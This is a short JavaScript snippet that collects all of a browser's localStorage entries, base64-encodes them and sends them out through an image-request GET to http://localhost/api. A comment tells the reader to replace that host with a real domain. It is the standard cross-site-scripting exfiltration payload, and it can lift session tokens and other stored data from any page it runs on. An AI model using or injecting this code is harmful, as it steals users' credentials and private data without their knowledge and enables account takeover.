const localStorageData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  localStorageData[key] = value;
}

const jsonData = JSON.stringify(localStorageData);
const encodedData = btoa(jsonData);

// Replace with your actual domain in production
const url = `http://localhost/api?data=${encodeURIComponent(encodedData)}`;

const img = new Image();
img.src = url; // This sends a GET request
